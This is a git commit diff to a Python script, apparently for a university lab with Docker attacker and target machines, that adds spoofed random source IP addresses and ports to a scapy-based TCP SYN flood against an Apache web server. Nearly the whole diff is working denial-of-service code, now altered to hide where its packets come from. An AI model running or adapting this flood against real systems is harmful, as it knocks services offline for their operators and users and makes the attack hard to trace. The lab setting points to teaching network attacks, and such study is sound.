fef4c00924c3497eb35bedf5ae93c9d17ff49573
Lior Vinman <liorvi35@gmail.com>
2023-04-28 22:03:22 +0300

    spoofed src addr

--- Python/Attack.py
+++ Python/Attack.py
@@ -7,12 +7,13 @@ In our lab, there are `Attacker` and `Target` machines (docker-compose).
 The `Target` should run an apache2 web-server when the `Attacker` should attack that server,
 using this DDoS (Distributed-Denial-of-Service) attack.
 
-:version: 1.2
+:version: 1.3
 :since: 28/04/2023
 :authors: Lior Vinman & Yoad Tamar
 """
 
 import scapy.all as scapy
+import random
 import time
 import sys
 
@@ -26,16 +27,35 @@ SUCCESS = 0  # program's success exit code
 FAIL = 1  # program's failure exit code
 
 
+def random_ipv4():
+    """
+    this function generates a random ipv4
+    :return: an ipv4 address, in format: X.X.X.X where 0 <= X <= 255
+    :rtype: str
+    """
+    return f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+
+
+def random_port():
+    """
+    this function generates a random port number
+    :return: a random port number P so that: 1024 <= P <= 65535
+    :rtype: int
+    """
+    return int(random.randint(1024, 65535))
+
+
 def main():
     try:
-        ip_header = scapy.IP(src=ATTACKER_ADDR[0], dst=TARGET_ADDR[0])
-        tcp_header = scapy.TCP(sport=ATTACKER_ADDR[1], dport=TARGET_ADDR[1], flags=SYN_FLAG)
-        syn_packet = (ip_header / tcp_header)
-
         avg = 0
         with open(FILE, "w") as file:
             for i in range(NUM_ITERATIONS):
                 for j in range(NUM_PACKETS):
+
+                    ip_header = scapy.IP(src=random_ipv4(), dst=TARGET_ADDR[0])
+                    tcp_header = scapy.TCP(sport=random_port(), dport=TARGET_ADDR[1], flags=SYN_FLAG, seq=0)
+                    syn_packet = (ip_header / tcp_header)
+
                     before_send = time.time()
                     scapy.send(syn_packet, verbose=False)
                     after_send = time.time()
